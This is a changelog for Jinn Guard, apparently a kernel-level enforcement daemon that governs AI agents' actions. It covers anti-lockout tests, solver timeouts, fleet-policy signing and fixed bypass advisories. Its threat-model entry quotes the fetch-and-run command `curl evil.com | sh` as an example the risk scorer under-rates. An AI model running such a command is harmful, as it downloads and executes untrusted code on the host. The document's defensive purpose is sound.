# Changelog

All notable changes to Jinn Guard are documented here. This project is a
validated research prototype / controlled-pilot MVP; see
[`THREAT_MODEL.md`](THREAT_MODEL.md) for the security model and honest scope.

## [Unreleased]

Operability and review-driven hardening (moving toward pilot-ready).

### Security / hardening
- **Anti-lockout invariants regression-tested on real kernels (JG #43).** Two new
  armed `kernel_lsm` tests assert the guarantees that keep governance from bricking
  the host: (1) `test_kernel_ungoverned_host_is_never_locked_out` — the dual of the
  unsheddable-subtree test — proves the *same* operation denied inside the governed
  cgroup succeeds once the actor steps out of scope, so the operator's shell/desktop
  is structurally never denied; (2)
  `test_kernel_anti_lockout_governor_reachable_under_all_floors` — with the IPv4
  egress floor (#54), the AF_UNIX allowlist floor (#56), and the orchestrator
  denylist (#55) all armed and no operator allowlist entries, the Jinn Guard control
  socket and loopback stay reachable while a non-allowlisted unix connect is denied
  in the same run (so the reachability assertions are non-vacuous). Both run in the
  three-distro real-kernel matrix (6.12 / 6.17 / 5.14).
- **Z3 solver per-check timeout (250 ms), fail-closed.** The SMT solver now runs
  under a bounded timeout so a pathological or maliciously complex policy cannot
  stall a decision; on timeout Z3 returns `Unknown`, which is treated as **DENY**.
- **`THREAT_MODEL.md` §8 "Threats to validity — the risk model."** Documents
  honestly what the Z3 proof does and does *not* establish: the guarantee is
  conditional on a heuristic risk classifier (default score 35; e.g.
  `curl evil.com | sh` is under-scored), the risk/Z3 layer is defense-in-depth
  rather than the primary gate (intent allowlist + kernel exec enforcement are),
  and client-declared risk can only *raise* the score, never lower it. Adds
  model-based scoring and interpreter child-process attribution to the open items.

### Added
- **Signed fleet-policy client hook (`--fleet-policy-url`), gated behind the
  `fleet` Cargo feature** (part of `--features enterprise`; **off by default**).
  When built with the feature, the daemon can pull a signed, versioned
  `PolicyBundle` from an external fleet control plane, verify its HMAC-SHA256
  signature (`--fleet-secret-file`, default: admission secret), enforce rollback
  protection (version must not regress), cache the last good bundle for offline
  restart (`--fleet-policy-cache`), and hot-reload on change. Every failure path
  keeps the current policy (fail-safe). Default public builds are **single-node**
  and never reach the network for policy. The control-plane *server* that issues
  these bundles is **not** in this repo — it lives in the private
  `jinn-guard-enterprise` repo. This flag is the stable open-core integration
  seam a fleet manager connects to. Validated end-to-end against the live daemon
  (correct key applies v1→v2, wrong key rejected, offline cache written).
- **Prometheus `/metrics` endpoint** (opt-in via `JINNGUARD_METRICS_PORT`,
  loopback-only). Dependency-free; exposes uptime, proposals, userspace
  allow/deny (with denial reasons), kernel-LSM allow/deny, and build info. Adds a
  `/healthz` liveness probe. No behavior change when unset.
- **`OPERATOR_RUNBOOK.md`** — install, configuration, operating modes, start/stop,
  monitoring, health checks, upgrade/rollback, incident response (disable
  enforcement fast), exit-code reference, and troubleshooting.
- **Fleet accept/reject decision is now a pure, tested function**
  (`fleet_policy::evaluate_bundle`). The daemon's refresh loop calls it, so the
  unit tests cover the exact production path: apply-forward, reject-rollback
  (version below the floor), reject-bad-signature, and already-applied no-op
  (incl. rollback taking precedence over a bad signature). A new CI job (**Fleet
  feature gate**) builds, clippy-checks, and runs these with `--features fleet`,
  so the gated open-core client can't silently rot.

### Fixed
- **Adversarial harness binary auto-detection.** `tests/swarm_attack.rs` used to
  hard-code `target/debug/ts_cli`, so the documented reproduce command
  `cargo test --release --test swarm_attack` failed with a spurious
  `No such file or directory` on a clean checkout unless `JINNGUARD_TEST_BINARY`
  was set by hand. The harness now auto-detects the daemon binary (prefers the
  test's own build profile, falls back to the other), so both `cargo test` and
  `cargo test --release` work out of the box; the env var still overrides.
  Verified on a second host (Azure Debian 13 / Xeon): 12/12 adversarial tests
  pass, 0 fail-open.

## [v1.0.0-rc2] — 2026-06-11

Productionization hardening (M7) and a green CI. No behavior change to the
governance or enforcement paths; everything validated in rc1 still holds.

### Added
- **eBPF compilation gated in CI.** The `build-ebpf` job now installs `bpftool`,
  generates `vmlinux.h` from the runner's BTF, and compiles all five LSM objects
  with the validated clang flags. It no longer `continue-on-error`s — a change
  that breaks BPF compilation now fails the build.
- **Structured CLI exit codes.** Startup failures emit a single machine-parseable
  line (`jinnguard: fatal code=<n> kind=<KIND> msg="…"`) and exit with a
  sysexits-style code so a supervisor can branch on the cause: `78` config
  (missing HMAC secret), `69` kernel LSM unavailable, `70` internal. Unit-tested.
- **Opt-in capability hardening.** With `JINNGUARD_HARDEN_CAPS=1`, after the LSM
  programs are loaded the daemon sets `no_new_privs` and drops a curated set of
  dangerous capabilities (CAP_SYS_MODULE, CAP_NET_ADMIN, CAP_SYS_BOOT, …) from
  the bounding set. Default off; never removes a capability the daemon needs at
  runtime (guarded by a unit test) so enforcement is unaffected.

### Changed
- **CI is fully green.** Resolved pre-existing `cargo fmt --check` and
  `cargo clippy -- -D warnings` failures (manual suffix-strip → `strip_suffix`,
  `iter().any()` → `Vec::contains`, an explicit `too_many_arguments` allow on the
  MCP connection handler, and `dead_code` allows on items live only under the
  `kernel_telemetry` verdict path / tests). No behavior change.

## [v1.0.0-rc1] — 2026-06-11

First labeled release candidate. The governance pipeline, kernel enforcement,
and operator-safety guarantees are feature-complete and validated on a real
Linux 6.12 host across all four validation tiers.

### Highlights
- **Kernel enforcement validated, armed, on real hardware.** 2,500 enforced
  operations across execve / TCP / UDP / file-create / file-unlink with
  **0 fail-open** and **0 incorrect decisions** (Tier 4).
- **Operator can never be locked out.** Enforcement is now cgroup-scoped in the
  kernel: only the governed cgroup is subject to allow/deny; every other task —
  including the operator's desktop — passes through untouched. Validated armed on
  a single-machine laptop with no lockout.

### Added
- **Anti-lockout invariants (M1).** `operator_safety_invariants` (default build)
  and `safe_mode_invariants` (kernel-feature build) pin the guarantee that
  base-system/desktop processes are always allowed and safe mode stays audit-only.
  CI runs the kernel-feature tests.
- **Policy-driven enforcement scope (M3).** `enforcement_scope.governed_path_prefixes`
  makes governance host-wide and additive, with two anti-lockout guards
  (base-system prefixes rejected at install and re-excluded at lookup).
- **Adaptive layer with deterministic floors (M6).** Per-agent, bounded
  (cap 40.0), monotonic, tighten-only risk penalty applied before Z3 and the hard
  ceiling. Never loosens a decision; properties pinned by `adaptive_floor_tests`.
- **cgroup-scoped kernel enforcement (M5b).** `bpf_get_current_cgroup_id()` gate
  in all five LSM hooks; daemon resolves `JINNGUARD_GOVERN_CGROUP` to a cgroup id
  and sets the scope map before attach. Fails safe toward the operator.
- **Reviewer deliverable (M7).** One-command, capability-aware
  `scripts/run_professor_validation.sh` (4 tiers), `PROFESSOR_VALIDATION.md`, and
  an artifact-free review package builder (`scripts/make_review_package.sh`).
- **Threat model & security review (M8).** [`THREAT_MODEL.md`](THREAT_MODEL.md) —
  trust boundaries, adversary model, threat→mitigation mapping with evidence, CVE
  log, and disclosed residual risks.

### Fixed
- **JG-ADV-2026-002 (Critical) — filesystem policy bypass via relative paths.**
  Kernel now resolves the full absolute path before the denylist check
  (`jg_read_dentry_path`, depth-12 dentry walk). Verified audit-only and armed.
- **JG-ADV-2026-001 (High) — execve bypass via interpreter chains.** Governed agents
  are denied known interpreters (`DENY_INTERPRETER_NOT_ALLOWED`).
- **Fail-open regression (enterprise18).** The `system_immunity` and
  "out-of-scope" ALLOW fast-paths ran *before* the gate chain, letting
  authenticated proposals short-circuit replay/identity/quota/Z3. Relocated to
  STEP 11.5, after the full chain. Restores 13/13 integration + 12/12 swarm.
- **Stale pinned ring buffer on restart.** A restarted daemon re-attached to a
  stale `LIBBPF_PIN_BY_NAME` ring buffer and saw zero telemetry;
  `clear_stale_request_pin()` now clears it on startup.
- **Validator robustness.** Cargo-under-sudo PATH, Docker-compose log prefixes,
  and running the kernel suite via a prebuilt test binary (cargo is not on root's
  PATH) — all fixed so the one-command validator works on a clean host.

### Validation (real Linux 6.12 host)
| Tier | Result |
|---|---|
| 1 — full suite (~117 tests) | PASS |
| 2 — Docker mandatory mediation (7/7 probes) | PASS |
| 3 — kernel full-path resolution (audit-only) | PASS |
| 4 — kernel allow/deny enforcement (cgroup-scoped) | PASS, 0 fail-open |

### Known limitations
- Not independently audited; single-distribution (Debian) validation.
- Sub-mount filesystem path *strings* (telemetry) are relative to their mount
  root; the enforcement decision keys on the directory's `(s_dev, i_ino)` identity
  (JG #52), so a mount/bind/`pivot_root` remap cannot fool it (THREAT_MODEL §7.1).
- Interpreter chains mitigated, not eliminated.
- HMAC key rotation not yet automated.

See [`THREAT_MODEL.md`](THREAT_MODEL.md) §7 and §9 for the full list and the path
to audited GA.
